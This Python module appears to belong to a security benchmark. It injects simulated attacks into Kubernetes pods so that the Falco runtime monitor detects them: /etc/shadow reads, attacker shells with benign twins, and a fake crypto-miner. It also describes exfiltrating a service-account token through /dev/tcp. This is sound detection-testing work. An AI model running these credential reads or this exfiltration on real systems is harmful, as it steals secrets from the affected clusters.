# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

"""Security-RUNTIME fault injectors (Falco-visible behavioral drift).

Where SecurityMisconfigInjector changes declarative *state* (OPA territory), this injector
produces malicious runtime *behavior* — a syscall-level event that leaves NO spec change and NO
telemetry symptom. The only witness is a runtime monitor (Falco). This is the regime where the
tool is load-bearing for accuracy: a shell agent inspecting specs/logs/metrics is blind, because
there is nothing there to see.

Slice scope: `rogue_shell` — a rogue process inside a running app pod repeatedly reading a
sensitive credential file (/etc/shadow). Fires Falco's default "Read sensitive file untrusted"
rule (MITRE T1555, Credential Access). Non-breaking: the app keeps serving.

Design note (persistent vs one-shot): the rogue process runs in a background loop so alerts stay
fresh for the whole episode (a Falco-equipped agent can query any reasonable window and still see
it). It's a background process inside ONE pod, so base's normal investigation (logs/metrics/specs)
won't surface it — base would have to `exec ps` the exact compromised pod among many.

RQ2 matched twins (one attack, two benign look-alikes) — the specificity test
-----------------------------------------------------------------------------
A benign twin only tests specificity if it fires the SAME Falco rule as an attack; otherwise the
agent dismisses it by rule-type and never has to reason about context. All three fire
"Terminal shell in container", same priority, same pod:

    attacker_shell      TTY shell -> recon + `cat /etc/shadow`          (detected=True)
                        fires "Terminal shell in container" AND "Read sensitive file untrusted"
    benign_admin_shell  TTY shell -> harmless diagnostics only          (detected=False)
                        fires "Terminal shell in container" ONLY
    benign_secret_read  TTY shell -> reads its OWN mounted SA token     (detected=False)
                        fires "Terminal shell in container" ONLY

The discriminator is what the shell *did* — exactly the SOC judgement: a shell alone is not a
compromise, a shell plus *someone else's* credentials is. An agent that flags every
"Terminal shell in container" alert now produces a visible false positive on both twins.

The two twins sit at different difficulties, deliberately: `benign_admin_shell` is anodyne
(`uname`, `df`), so "no credential access" is easy to see; `benign_secret_read` DOES touch a
credential, just its own, so the agent must distinguish self-access from theft rather than just
checking whether a secret was touched at all.

TTY mechanics (why the twin used to fire nothing): Falco's "Terminal shell in container" requires
`proc.tty != 0`, and `kubectl exec -t` SILENTLY disables the TTY when its stdin is not a terminal
(kubectl's SetupTTY drops `-t` if `-i` is absent, or if stdin is not a tty). So the loop must pass
`-i -t` AND own a real PTY — see `_start_host_loop(tty=True)`. Because that is easy to get wrong
and fails *silently*, every runtime injector now verifies against Falco that its expected rules
actually fired, and raises if not (a mislabelled episode is worse than a failed one).

S7 — crypto-miner behaviour: the TWO-SURFACE fault (and why it breaks this file's mould)
----------------------------------------------------------------------------------------
`crypto_miner` / `benign_cpu_job` are the S7 pair from `reports/BENCHMARK_IDEAS.md` §2. Every
OTHER fault in this module is Falco-ONLY by construction — the whole point of the module is the
regime where telemetry is blind. S7 is deliberately the exception: it is visible on TWO surfaces
at once, and for two DIFFERENT reasons.

    Falco     sees a miner-shaped process    -> "this is an intrusion"   (T1496, Impact)
    telemetry sees one core pegged at 100%   -> "this is a hot workload" (a reliability symptom)

That divergence is the experiment. An agent that stops at "CPU is high" lands on a *reliability*
diagnosis and, on the severity question, on a *reliability* severity — which is the wrong answer
for resource hijacking even though the observation that produced it was correct. A future reader
should not generalise this file's "runtime == Falco-only" rule to S7; the ground truth carries
`detection_surface: ["falco", "telemetry"]` for exactly this reason.

Re-executed every 8s, NOT one continuous process — and the reason is a bug this file's first
version actually shipped with, not a design preference stated in advance. Falco's stratum rule
matches `spawned_process`, i.e. an execve event: edge-triggered, fires once per exec, never again
while the same process just keeps running. Injection happens inside `init_problem()`, BEFORE the
client calls `orchestrator.session.start()` and sets the Falco session floor (`ARRIVE_SESSION_START`
— see `mcp_servers/README.md`). A version of this injector that `kubectl exec`'d ONE long-lived
background process fired exactly one alert, at injection time, strictly before the floor — so it
existed, but no query the agent was allowed to make could ever see it. `sensor_probe` (a fresh,
post-episode query) found 0 alerts too, for the same reason. The agent read Falco correctly; there
was nothing left in its window to read. Confirmed live: `security_crypto_miner-detection-1` ran
end-to-end, `_verify_falco` passed at injection, and the recorded episode still shows
`sensor_fired: false` and zero alerts of any kind.

The fix makes S7 behave like every OTHER injector in this file: `crypto_miner` and
`benign_cpu_job` now run through `_start_host_loop`, the same HOST-side re-exec loop
`rogue_shell`/`attacker_shell`/the benign shell twins already use, so a fresh execve — and a fresh
alert — lands inside the agent's window every ~8s for the whole episode. What is genuinely S7-
specific is that each cycle must ALSO keep the core busy for most of that 8s, or the "sustained
CPU" telemetry signal disappears between cycles — see `_cpu_loop_action` for how that is done
without leaving anything backgrounded in the pod.

Which Falco rules, and the two constraints that decided the mechanism
--------------------------------------------------------------------
Verified against the pinned upstream ruleset (chart `falco-9.1.0` / Falco 0.44.1, engine 0.62.0;
rules read from `falcosecurity/rules` at tags `falco-rules-5.1.0` and `falco-sandbox-rules-6.1.0`),
NOT from memory. Three miner rules exist upstream, and only one of them is usable here:

  1. "Detect crypto miners using the Stratum protocol"  -> USED, and required.
     `spawned_process and proc.cmdline contains "stratum+tcp"` (or stratum2+tcp/+ssl). A pure
     command-line substring match: no network contact, no mining, nothing to fake. We give the
     simulated miner a real-looking pool URI in its argv and the rule fires on the literal string
     the rule's authors chose to key on. Enabled by default. priority CRITICAL, tags T1496.

  2. "Known Cryptominer Process Executed"               -> NOT USED. Structurally SHADOWED.
     `spawned_process and proc.name in (miner_binaries)` (xmrig, minerd, cgminer, ...). The
     simulated miner DOES satisfy it — Falco records `proc.name=xmrig` on the execve — and it is
     loaded and enabled, and it still never reports. Falco's default `rule_matching: first`
     (falco.yaml, confirmed on the deployed pod) reports only the FIRST rule that matches a given
     event, and the stratum rule sits earlier in falco-sandbox_rules.yaml (line 1488 vs 1826). So
     the two miner rules can never both fire on one process exec: whichever comes first wins.
     Measured, not reasoned about — the injection was run with both rules loaded and only the
     stratum rule appeared. The ground truth therefore asserts ONE rule, and this one is recorded
     as `shadowed_falco_rules` so a future reader does not "fix" its absence. Making it reachable
     would mean setting `rule_matching: all`, which changes the alert volume for every arm and is
     a campaign decision, not an injector one. Nothing is lost by leaving it shadowed: both rules
     are CRITICAL/T1496 and say the same thing.
     (It also exists only at sandbox-rules >= 6.1.0, added in that single tag.)

  3. "Detect outbound connections to common miner pool ports" -> NOT USED. Cannot be fired.
     This is the rule the S7 brief assumed we would trip with a local sink on a miner port, and
     it is structurally impossible to trip benignly. Its macro chain is
         net_miner_pool = connect/sendto/sendmsg
                          AND fd.net != "127.0.0.0/8" AND NOT fd.snet in (rfc_1918_addresses)
                          AND (fd.sport in (miner_ports) AND fd.sip.name in (miner_domains)) | ...
     so the destination must be (a) OUTSIDE RFC1918 — which excludes every ClusterIP/pod IP a
     sink of ours could have — and (b) reverse-resolve to a name on a hard-coded list of REAL
     mining pools. Firing it therefore requires contacting an actual pool, which this project
     will not do. It is also `enabled: false` upstream by default. Consequence: a benign network
     sink on port 3333 would fire NOTHING on any surface the benchmark reads, so it is not built
     — the pool endpoint lives in the miner's argv (where rule 1 reads it) and nowhere else.

RULESET PREREQUISITE — read before running S7. All three miner rules live in
`falco-sandbox_rules.yaml` (`maturity_sandbox`). The chart installs `falco-rules:5` ONLY, so on
the Falco this project deploys today **none of them is loaded** and S7 cannot fire. Running S7
requires adding the sandbox ruleset to the Falco install, e.g.
    --set falcoctl.config.artifact.install.refs="{falco-rules:5,falco-sandbox-rules:6.1.0}"
    --set falcoctl.config.artifact.follow.refs="{falco-rules:5,falco-sandbox-rules:6.1.0}"
    --set "falco.rules_files={/etc/falco/falco_rules.yaml,/etc/falco/falco-sandbox_rules.yaml,\
                              /etc/falco/falco_rules.local.yaml,/etc/falco/rules.d}"
That is a cluster-wide change (it adds the whole sandbox tier to every arm's alert surface and to
falco_l3's `possibility_space`), so it is a campaign decision, not an injector detail.
`_require_miner_rules_loaded()` checks for it up front and fails with that message rather than
letting the episode die later in an opaque "rule did not fire".

S4 — data-exfil egress: the fault where the alert names the WRONG attack (and that is the point)
------------------------------------------------------------------------------------------------
`exfil_egress` / `benign_telemetry_egress` are the S4 pair from `reports/BENCHMARK_IDEAS.md` §2 and
`reports/S4_DESIGN.md`. A rogue process in the app pod ships data out over a fresh plaintext TCP
connection to an in-cluster collector. MITRE **T1048.003** (Exfiltration Over Unencrypted Non-C2
Protocol), tactic Exfiltration, severity CRITICAL.

Which Falco rule, and the structural wall that decided it (verified against the pinned ruleset,
and LIVE on a kind+Falco 0.44.1 cluster — see S4_DESIGN.md, not recalled):

  "Redirect STDOUT/STDIN to Network Connection in Container"  -> USED. STABLE ruleset, enabled by
  default, so S4 needs NO campaign ruleset change (unlike S7). Condition is
      `dup and container and evt.rawres in (0,1,2) and fd.type in ("ipv4","ipv6") and not ...`
  i.e. a stdio fd (0/1/2) dup'd onto an ipv4/ipv6 socket. A bash `> /dev/tcp/<host>/<port>`
  redirect dups the TCP socket onto fd 1 and fires it. The rule keys on the socket-dup, NOT on the
  destination — no IP/port/allowlist in the condition — so it fires IDENTICALLY for the attack and
  the benign twin, and cannot tell the agent which is which. That is the design: the agent must
  reason from what was read and where it went, not read a verdict off the alert.

  The WALL that forced this rule (the same one S7 hit): every `outbound`-macro rule ends with
  `not fd.snet in (rfc_1918_addresses)`, and every in-cluster ClusterIP/pod IP is RFC1918 — so no
  `outbound` rule (including the exfil-tagged "Interpreted procs outbound network activity") can
  EVER fire on a sink we host in-cluster. The `dup`-based rule sidesteps this because it does not
  look at the destination at all. Consequence worth knowing: the firing rule's own tag reads
  `mitre_execution / T1059` ("reverse shell / RCE"), NOT exfiltration — a DIFFERENT wrong label,
  not the answer. The ground truth still records T1048.003 (what the injector did); the tag/GT
  divergence is a feature, and it only bites the SEVERITY sub-question (scored ordinally).

The C2 sink (in-cluster only, nothing leaves the node): TWO minimal python raw-socket
accept-and-drain pods + ClusterIP Services in the app namespace — `data-collector` (the attack's
destination; a NEUTRAL name, deliberately NOT "exfil-sink", so the destination name never leaks the
verdict) and `telemetry-collector` (the twin's documented-legitimate destination). Both are
deployed by BOTH halves so the cluster state is identical and the ONLY difference is the loop's
action. They store nothing (drain to nothing); they exist only so the client's connect+dup
succeeds. Note (measured): a freshly-started sink pod fires its OWN startup alerts
("Drop and execute new binary", "Launch Sensitive Mount Container") on the SINK pod — those carry
the sink's k8s.pod.name, so `_verify_falco(pod=<app pod>)` filters them out, and the problem
session's normal startup-noise settle ages them out of the agent's window.

Attack vs twin — same rule, differ in SOURCE (primary) and DESTINATION (corroboration):
  exfil_egress            transient host-loop: `cat <SA token> > /dev/tcp/data-collector/9000`
                          reads a real credential (the mounted SA token) and ships it to the
                          unlisted collector. Fires ONLY "Redirect STDOUT/STDIN..." on the app pod
                          (the SA token is NOT in Falco's `sensitive_files`, so no second rule —
                          kept single-signature so it is a pure exfil, not an S5->S4 chain).
  benign_telemetry_egress transient host-loop: `cat /proc/uptime > /dev/tcp/telemetry-collector/9000`
                          ships innocuous uptime telemetry to the documented collector. Fires the
                          SAME one rule. The discriminator an agent can actually read is the
                          `proc.cmdline` field (token vs /proc/uptime) and the destination Service.

Transient host-loop, not persistent-in-pod (like transient_read, not like the miner): each cycle
is a one-shot `kubectl exec` that exits, so nothing lingers in the pod for `ps` — base's
logs/metrics/specs/`ps` investigation is blind and only Falco's per-cycle alert witnesses it.
"""

import json
import os
import pty
import subprocess
import time

from aiopslab.service.kubectl import KubeCtl
from aiopslab.generators.fault.base import FaultInjector

# marker embedded in the rogue command so recovery can find & kill it
_ROGUE_MARKER = "cat /etc/shadow"
# marker on every host-side loop's cmdline (transient attack + benign twins) so recovery/cleanup
# can pkill them all with one pattern. Kept as a stable string for the run-command sweep's pkill.
_HOST_LOOP_MARKER = "ARRIVE_HOST_LOOP"

# ---- S7 crypto-miner pair (see the module docstring for the rule verification) ----------------
# Markers on the in-pod process cmdlines so recovery can find them. The pkill patterns below spell
# them with a bracket class (ARRIVE_MINER[_]SIM) so the pkill command's OWN cmdline — and its
# parent `sh -c` — do not match the pattern and kill the recovery shell mid-sweep.
_MINER_MARKER = "ARRIVE_MINER_SIM"
_CPU_JOB_MARKER = "ARRIVE_CPU_JOB"

# The pool endpoint. Nothing ever connects to it: `.invalid` is RFC 2606's guaranteed-unresolvable
# TLD, so even an accidental lookup fails locally and can never reach a real mining pool. Port 3333
# is on Falco's `miner_ports` list — carried for realism, not for detection (that rule is
# unfireable here; see the docstring).
#
# It is written SPLIT (`$S+tcp://`, with S=stratum assigned in the pod) and that is load-bearing,
# not a style choice. Falco's rule is `proc.cmdline contains "stratum+tcp"` and it is tagged
# `host` as well as `container`, so ANY process whose command line carries the literal substring
# fires it — including the injector's own `kubectl exec ...` on the host and the in-pod `sh -c`
# that launches the miner. Measured, before this was split: 8 alerts, of which 2 were the
# HARNESS's own host-side processes (proc.name=kubectl / sh, no k8s.pod.name) and 6 were launcher
# shells rather than the miner. Two things were wrong with that. The harness was writing its own
# fingerprints into the evidence stream the agent reads, and `_falco_rules_fired` cannot filter
# host alerts out by pod (they carry no pod name), so verification could have passed on the
# harness's noise while the in-pod miner failed silently. Splitting the literal means only the
# fully-expanded argv of the miner's own exec chain contains it.
_MINER_POOL_SPLIT = "$S+tcp://pool.arrive-sim.invalid:3333"
_MINER_POOL_URI = "stratum+tcp://pool.arrive-sim.invalid:3333"   # what the process ends up with

# The miner's process name is produced by SYMLINKING a shell to /tmp/xmrig and exec'ing that path:
# Linux sets `comm` from `kbasename(bprm->filename)` — the path handed to execve, not the resolved
# symlink target — so `proc.name` becomes "xmrig" (in Falco's `miner_binaries`) while the inode
# actually executed is still the base image's /bin/sh. That last part is the point: a `cp` would
# give the same name but make the exe an upper-layer file, which fires the stable rule "Drop and
# execute new binary in container" — an extra signature the benign twin has no way to match. The
# symlink keeps `proc.is_exe_upper_layer=false` and the pair's non-miner signature identical.
_MINER_EXE = "/tmp/xmrig"
# The twin's name is built the same way, so the two halves differ ONLY in miner-specific strings.
# Kept under 15 chars: `comm` is truncated at TASK_COMM_LEN-1 and a truncated name would not match
# any list at all (which for the twin would hide a real failure rather than cause one).
_CPU_JOB_EXE = "/tmp/analytics-job"

_MINER_RULE_STRATUM = "Detect crypto miners using the Stratum protocol"
_MINER_RULE_KNOWN_BINARY = "Known Cryptominer Process Executed"

# ---- S4 data-exfil egress pair (see the S4 section of the module docstring) -------------------
# The rule fired by BOTH halves — a plain socket-dup detection, NOT destination-aware, NOT named
# for exfil/C2. Verified against falco-rules-5.1.0 (the deployed stable ruleset) and live.
_EXFIL_RULE_REDIRECT = "Redirect STDOUT/STDIN to Network Connection in Container"
# The two in-cluster collectors. Names are load-bearing: the attack's destination is NEUTRAL
# (`data-collector`) so it never announces the verdict; the twin's is the documented-legitimate
# `telemetry-collector`. The discriminator is the SOURCE read (cmdline), not the destination name.
_EXFIL_ATTACK_SINK = "data-collector"
_EXFIL_TWIN_SINK = "telemetry-collector"
_EXFIL_SINK_PORT = 9000
_EXFIL_SINK_IMAGE = os.getenv("ARRIVE_SINK_IMAGE", "python:3.11-slim")
# Label for bulk teardown of every sink this module creates.
_EXFIL_SINK_LABEL = "arrive-sink"
# What each half reads and where it sends it. Delivered through `bash -c '<...>'`: `> /dev/tcp/...`
# is a bash builtin (sh/dash lack it) and is what performs the socket dup the rule matches.
_EXFIL_ATTACK_SOURCE = "/var/run/secrets/kubernetes.io/serviceaccount/token"   # a real credential
_EXFIL_TWIN_SOURCE = "/proc/uptime"                                           # innocuous telemetry

# Where Falco lives, for post-injection verification (mirrors mcp_servers/falco_source.py).
FALCO_NAMESPACE = os.getenv("FALCO_NAMESPACE", "falco")
FALCO_SELECTOR = os.getenv("FALCO_SELECTOR", "app.kubernetes.io/name=falco")
# Set ARRIVE_VERIFY_INJECTION=0 to downgrade verification failures to a warning (debugging only —
# runs with it disabled must not be used as results).
_VERIFY = os.getenv("ARRIVE_VERIFY_INJECTION", "1") != "0"

# PTY master fds kept open for the lifetime of the process: closing the master makes the slave
# return EIO, which would kill the loop's kubectl streams. One fd per TTY injection; released by
# _stop_host_loops().
_PTY_MASTERS: list[int] = []


class FaultVerificationError(RuntimeError):
    """An injector ran but Falco did not observe the behaviour it is defined by.

    Raised (not warned) on purpose: the ground truth asserts these rules fired, so continuing
    would produce a mislabelled episode — a silent data-quality failure that reads as a model
    failure downstream.
    """


class SecurityRuntimeInjector(FaultInjector):
    def __init__(self, namespace: str):
        super().__init__(namespace)
        self.namespace = namespace
        self.kubectl = KubeCtl()

    def _first_pod(self, service: str) -> str | None:
        """Name of a running pod for `service` (DeathStarBench pods are '<service>-<hash>')."""
        out = self.kubectl.exec_command(
            f"kubectl get pods -n {self.namespace} -o name --field-selector=status.phase=Running"
        )
        for line in out.splitlines():
            name = line.strip().removeprefix("pod/")
            if name.startswith(service):
                return name
        return None

    # SR.1 - rogue_shell: rogue process reads /etc/shadow in a loop (Falco: Read sensitive file)
    def inject_rogue_shell(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            # Background subshell loop (no setsid/nohup dependency); survives exec-session exit,
            # keeps firing Falco every ~12s for the episode. stdin/out detached so exec returns.
            inner = f"(while true; do {_ROGUE_MARKER} >/dev/null 2>&1; sleep 12; done) </dev/null >/dev/null 2>&1 &"
            cmd = f"kubectl exec {pod} -n {self.namespace} -- sh -c '{inner}'"
            out = self.kubectl.exec_command(cmd)
            print(f"[security_runtime] rogue process reading /etc/shadow in pod {pod} "
                  f"({service}) | ns: {self.namespace} {out.strip()}")
            self._verify_falco(["Read sensitive file untrusted"], pod)

    def recover_rogue_shell(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                continue
            # best-effort kill; namespace teardown also removes it
            cmd = f"kubectl exec {pod} -n {self.namespace} -- sh -c 'pkill -f \"{_ROGUE_MARKER}\" 2>/dev/null; true'"
            self.kubectl.exec_command(cmd)
            print(f"[security_runtime] killed rogue process in pod {pod} ({service}) | ns: {self.namespace}")

    # ---- shared host-side loop (used by the transient attack AND the benign twins) ----
    # A background loop ON THE HOST periodically `kubectl exec`s a ONE-SHOT command that exits at
    # once, so nothing lingers in the pod for `ps` to find — only Falco's log records the activity.
    # The action is what differs: a malicious read (/etc/shadow) vs a benign one (admin diagnostics,
    # app reading its own token). Self-terminating on pod/cluster disappearance; bounded kubectl.
    def _start_host_loop(self, pod: str, action: str, tty: bool = False):
        """Loop a one-shot `kubectl exec` against `pod` every 8s.

        tty=True allocates a real PTY for the loop's stdin and execs with `-i -t`, so the process
        inside the container gets a controlling terminal (`proc.tty != 0`) and Falco's
        "Terminal shell in container" rule can fire. Without a PTY, kubectl quietly drops `-t` and
        the rule never fires — the defect this pair exists to avoid.

        Each exec is wrapped in `timeout 20` because `kubectl exec -i` can block waiting for stdin
        EOF; `--request-timeout` does not bound an upgraded stream.
        """
        check = f"kubectl get pod {pod} -n {self.namespace} --request-timeout=5s >/dev/null 2>&1"
        flags = "-i -t " if tty else ""
        act = (
            f"timeout 20 kubectl exec {flags}{pod} -n {self.namespace} "
            f"-- {action} >/dev/null 2>&1"
        )
        script = f": {_HOST_LOOP_MARKER} {pod}; while {check}; do {act}; sleep 8; done"

        stdin = subprocess.DEVNULL
        slave = None
        if tty:
            master, slave = pty.openpty()
            _PTY_MASTERS.append(master)  # held open on purpose; see module docstring
            stdin = slave

        subprocess.Popen(
            ["sh", "-c", script],
            stdin=stdin,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        if slave is not None:
            os.close(slave)  # the child holds its own copy

    def _stop_host_loops(self):
        """Kill every host-side loop driver. Does NOT interrupt an in-flight cycle.

        `pkill -f` matches on the DRIVER's own cmdline (the `: ARRIVE_HOST_LOOP ...` script), not
        on the `kubectl exec` it may currently have in flight — that child's cmdline never
        contains the marker. So a cycle already running when this is called finishes naturally
        (up to ~7-8s later for S7's pair) before the pod goes quiet; only the NEXT cycle is
        prevented from starting. Confirmed live: back-to-back miner -> benign_cpu_job tests with
        no settle gap produced one spurious "stratum fired" on the twin, from the miner's own
        trailing cycle bleeding past this call. Harmless within a real episode's normal
        recover-then-teardown flow, and pre-existing for every fault in this file that uses
        `_start_host_loop` — noted here because S7 is what surfaced it under back-to-back testing.
        """
        subprocess.run(
            f"pkill -f '{_HOST_LOOP_MARKER}'", shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        while _PTY_MASTERS:
            try:
                os.close(_PTY_MASTERS.pop())
            except OSError:
                pass

    # ---- post-injection verification against Falco ----

    def _falco_rules_fired(self, since_seconds: int, pod: str | None = None) -> set[str]:
        """Distinct Falco rule names observed in the last `since_seconds`, optionally for one pod."""
        try:
            out = subprocess.run(
                ["kubectl", "logs", "-n", FALCO_NAMESPACE, "-l", FALCO_SELECTOR,
                 f"--since={since_seconds}s", "--tail=-1", "--prefix=false"],
                capture_output=True, text=True, timeout=30,
            )
        except subprocess.TimeoutExpired:
            return set()
        rules: set[str] = set()
        for line in out.stdout.splitlines():
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                alert = json.loads(line)
            except json.JSONDecodeError:
                continue
            rule = alert.get("rule")
            if not rule:
                continue
            if pod:
                observed = (alert.get("output_fields") or {}).get("k8s.pod.name")
                # An alert with NO k8s.pod.name is a HOST event, not this pod's. It used to fall
                # through to "kept", which let verification pass on activity that never happened
                # in the container. That is not hypothetical: several of these rules are tagged
                # `host` as well as `container`, and the S7 miner rule matches any command line
                # containing "stratum+tcp" — so an operator (or this repo's own tooling) merely
                # MENTIONING the string on the host fires it, and a run was observed passing on
                # exactly that while the in-pod process fired something else entirely.
                if not observed or pod not in observed:
                    continue
            rules.add(rule)
        return rules

    def _verify_falco(self, expected: list[str], pod: str, attempts: int = 4, delay: int = 8):
        """Block until Falco has reported every rule in `expected` for `pod`, else raise.

        The loops fire every 8s, so a few short waits are enough. Failure means the injected
        behaviour is not observable — the episode's ground truth would be a lie.
        """
        waited = 0
        fired: set[str] = set()
        for _ in range(attempts):
            time.sleep(delay)
            waited += delay
            fired = self._falco_rules_fired(since_seconds=waited + 30, pod=pod)
            missing = [r for r in expected if r not in fired]
            if not missing:
                print(f"[security_runtime] verified Falco rules {expected} on pod {pod}")
                return
        msg = (
            f"[security_runtime] VERIFICATION FAILED for pod {pod}: expected Falco rule(s) "
            f"{missing} did not fire within {waited}s. Observed: {sorted(fired) or 'none'}. "
            "Common causes: Falco not installed/ready; the container lacks /etc/shadow or a shell; "
            "no PTY was allocated (the 'Terminal shell in container' rule needs proc.tty != 0)."
        )
        if _VERIFY:
            raise FaultVerificationError(msg)
        print(f"[warn] {msg} (ARRIVE_VERIFY_INJECTION=0 — continuing with an UNVERIFIED episode)")

    def _verify_falco_silent(self, forbidden: list[str], pod: str, settle: int = 25):
        """Assert that NONE of `forbidden` fired for `pod` — the benign twin's half of the contract.

        The positive check above is the wrong shape for a twin whose shared surface is not Falco.
        `benign_cpu_job` is supposed to look identical to the miner on telemetry and be SILENT on
        Falco: that silence is the discriminator, so it is a claim the ground truth makes and
        therefore a claim that has to be measured. A twin that quietly trips a miner rule is not a
        false-positive test any more, it is a mislabelled attack.
        """
        time.sleep(settle)
        fired = self._falco_rules_fired(since_seconds=settle + 30, pod=pod)
        leaked = [r for r in forbidden if r in fired]
        if not leaked:
            print(f"[security_runtime] verified BENIGN twin on pod {pod}: none of {forbidden} fired")
            return
        msg = (
            f"[security_runtime] TWIN VERIFICATION FAILED for pod {pod}: benign activity fired "
            f"{leaked}, which is the attack half's discriminating rule set. The pair no longer "
            "separates attack from look-alike, so this episode would be mislabelled."
        )
        if _VERIFY:
            raise FaultVerificationError(msg)
        print(f"[warn] {msg} (ARRIVE_VERIFY_INJECTION=0 — continuing with an UNVERIFIED episode)")

    def _require_miner_rules_loaded(self):
        """Fail fast if Falco has no miner rules loaded at all (the default install has none).

        The miner rules ship in the SANDBOX ruleset; the chart installs `falco-rules:5` only, so
        the ordinary failure mode for S7 is not "the injection missed" but "the detector was never
        there". Distinguishing those two costs one exec and saves a confusing verification error.
        Best-effort: if the ruleset cannot be read, say so and continue — `_verify_falco` is still
        the real gate.
        """
        try:
            pods = subprocess.run(
                ["kubectl", "get", "pods", "-n", FALCO_NAMESPACE, "-l", FALCO_SELECTOR,
                 "-o", "jsonpath={.items[0].metadata.name}"],
                capture_output=True, text=True, timeout=30,
            ).stdout.strip()
            if not pods:
                print("[security_runtime] could not find a Falco pod — skipping ruleset preflight")
                return
            out = subprocess.run(
                ["kubectl", "exec", "-n", FALCO_NAMESPACE, pods, "-c", "falco", "--",
                 "sh", "-c", "grep -rl 'Stratum protocol' /etc/falco 2>/dev/null"],
                capture_output=True, text=True, timeout=60,
            )
        except (subprocess.TimeoutExpired, OSError) as e:
            print(f"[security_runtime] ruleset preflight inconclusive ({e}) — continuing")
            return
        if out.stdout.strip():
            print(f"[security_runtime] miner ruleset present: {out.stdout.strip().splitlines()}")
            return
        msg = (
            "[security_runtime] S7 PREREQUISITE MISSING: no miner rules are loaded in Falco. "
            f"'{_MINER_RULE_STRATUM}' lives in falco-sandbox_rules.yaml (maturity_sandbox), and "
            "the falco chart installs 'falco-rules:5' (stable) only. Add the sandbox ruleset to "
            "the Falco install — see the S7 section of this module's docstring for the exact "
            "helm flags — or S7 will fire nothing on any arm."
        )
        if _VERIFY:
            raise FaultVerificationError(msg)
        print(f"[warn] {msg} (ARRIVE_VERIFY_INJECTION=0 — continuing with an UNVERIFIED episode)")

    # ---- shared shape for the S7 pair ------------------------------------------------------
    # Both halves are the SAME mechanism with different strings, so that the only thing that can
    # separate them on the Falco surface is the miner signature itself and never an artefact of
    # how they were delivered. Delivered through `_start_host_loop` — the same HOST-side re-exec
    # loop every other runtime problem in this file uses — for a reason that is NOT symmetry for
    # its own sake: see the module docstring's "Re-executed every 8s" section for the alert that
    # went stale under the previous one-shot-background design and why.
    _CPU_CYCLE_SECONDS = 7   # of each ~8s host-loop cadence; the rest is exec + loop overhead

    def _cpu_loop_action(self, exe: str, marker: str, payload: str, prelude: str = "") -> str:
        """Build the `action` for `_start_host_loop`: a fresh, TIME-BOUNDED busy loop per cycle.

        `X=<exe>; ln -sf /bin/sh $X || X=/bin/sh` names the process (see `_MINER_EXE`'s comment);
        `nice -n 19` keeps the app's own threads winning every scheduling contest, so this reads
        as CPU utilisation and never pushes request latency into readiness-probe territory — a
        failing probe would put a SECOND telemetry symptom on the board, and S7's design depends
        on there being exactly one. `prelude` runs BEFORE the exec so `$VAR` references in
        `payload` expand into the miner's own argv rather than staying literal — see `_MINER_POOL_SPLIT`.

        The bound is `sleep N & W=$!; while kill -0 $W; do :; done` — a background timer checked by
        a builtin, NOT `while [ $(date +%s)... ]`. That was the first version of this method, and
        it was wrong in a way `_verify_falco` cannot catch, because Falco fired exactly as
        designed: `date +%s` is an external binary, so the "tight" loop forked and exec'd a real
        process on EVERY iteration. Measured on a live pod: the resulting CPU usage was ~12% of a
        core, not the ~100% S7's telemetry signal requires — fork+exec overhead dominated the
        loop's wall-clock time instead of computing. `kill -0` is a shell builtin (a plain syscall,
        no fork), so the checking loop is genuinely CPU-bound; re-measured the same way: ~99.7%.
        `sleep` itself still forks, but only ONCE per cycle, not once per iteration.

        Every `$` below meant for `$X`'s OWN interpreter (`$!`, `$W`, and the loop's `kill -0`) is
        escaped as `\\$`, for the same reason as the old date-based bound: the enclosing string is
        double-quoted in the POD-side shell that builds `$X`'s argv, and an unescaped `$!`/`$W`
        there refers to variables THAT SHELL never sets — it would expand to an empty string
        silently, handing `$X` a syntactically-different, broken script instead of erroring.
        """
        return (
            f"sh -c 'X={exe}; ln -sf /bin/sh $X 2>/dev/null; [ -x $X ] || X=/bin/sh; "
            "N=; command -v nice >/dev/null 2>&1 && N=\"nice -n 19\"; "
            f"{prelude}"
            f"$N $X -c \"{marker}=1; {payload}; "
            f"sleep {self._CPU_CYCLE_SECONDS} & W=\\$!; while kill -0 \\$W 2>/dev/null; "
            "do :; done\"'"
        )

    # SR.6 - crypto_miner (ATTACK, detected=True): S7, the TWO-SURFACE fault.
    #
    # A simulated miner — process named `xmrig`, a stratum+tcp pool URI in its argv, one core of
    # sustained load. No mining software runs and no pool is contacted: the "miner" is the base
    # image's own /bin/sh burning a loop, and the pool URI is an unresolvable .invalid name that
    # exists only to be read by Falco's cmdline match. Nothing here is a capability an attacker
    # would gain from it; it reproduces the two observables a defender's tooling keys on.
    #
    # Falco fires on the miner signature; `ps`/`top` inside the pod shows a pegged core. Those are
    # the two surfaces, and they support DIFFERENT conclusions — see the module docstring.
    _MINER_RULES = [_MINER_RULE_STRATUM]
    # Matches the miner but can never REPORT it under Falco's default `rule_matching: first`,
    # because the stratum rule sits earlier in the same file. Kept as a name so the twin can
    # assert it stays silent, and so its absence on the attack reads as designed, not as a bug.
    _MINER_RULES_SHADOWED = [_MINER_RULE_KNOWN_BINARY]

    def inject_crypto_miner(self, microservices: list[str]):
        self._require_miner_rules_loaded()
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            # S=stratum is assigned in the pod and only expands in the miner's own argv, so the
            # literal Falco matches on never appears in this host-side command. See _MINER_POOL_*.
            action = self._cpu_loop_action(
                _MINER_EXE, _MINER_MARKER,
                f"POOL={_MINER_POOL_SPLIT}; WORKER=arrive-sim",
                prelude="S=stratum; ",
            )
            self._start_host_loop(pod, action)
            print(f"[security_runtime] CRYPTO-MINER simulator (proc={_MINER_EXE}, "
                  f"pool={_MINER_POOL_URI}, 1 core, re-exec every 8s) in pod {pod} ({service}) "
                  f"| ns: {self.namespace}")
            self._verify_falco(self._MINER_RULES, pod)

    def recover_crypto_miner(self, microservices: list[str] = None):
        self._stop_host_loops()
